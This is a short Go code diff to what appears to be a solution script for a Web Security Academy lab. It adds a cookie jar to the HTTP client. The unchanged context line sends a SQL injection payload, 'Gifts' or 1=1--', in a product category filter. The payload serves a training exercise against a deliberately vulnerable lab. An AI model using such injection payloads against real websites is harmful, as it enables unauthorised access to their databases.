@@ -5,6 +5,7 @@ package main
 import (
 	"fmt"
 	"net/http"
+	"net/http/cookiejar"
 	"log"
 	"io"
 	"net/url"
@@ -18,7 +19,12 @@ func main() {
 }
 
 func solve() error {
-	client := &http.Client{}
+	jar, err := cookiejar.New(nil)
+	if err != nil {
+		return err
+	}
+
+	client := &http.Client{Jar: jar}
 
 	domain := "https://0a06001b03526b04c07004ae00980099.web-security-academy.net"
 	resp, err := client.Get(domain + "/filter?category=" + url.QueryEscape("Gifts' or 1=1--"))
